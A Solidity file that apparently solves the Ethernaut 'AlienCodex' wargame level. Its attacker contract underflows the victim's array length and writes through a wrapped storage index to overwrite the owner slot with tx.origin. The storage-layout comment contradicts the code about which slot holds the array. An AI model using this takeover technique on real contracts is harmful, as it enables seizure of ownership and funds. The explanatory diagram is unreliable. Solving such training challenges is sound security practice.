// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface AlienCodex {
    function owner() external view returns (address);

    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;
}

/**
   🔼 ➡️ ➡️
   🔼   ⬇️
   🔼 address private _owner;   slot 0  (codex[i+1])
   🔼 bool public contact;      slot 1
   🔼 bytes32[] public codex;   slot 2                 array length
   🔼 codex[0]                  slot keccak256(2)      first item
   🔼 ...
   🔼 codex[i]                  slot type(uin256).max
   🔼    ⬇️
   🔼 ⬅️ ⬅️

*/

contract AlienCodexAttacker {
    function attack(address victim) external {
        AlienCodex(victim).makeContact();

        AlienCodex(victim).retract();

        bytes32 location = keccak256(abi.encode(1));

        uint256 index = type(uint256).max - uint256(location) + 1;

        AlienCodex(victim).revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}
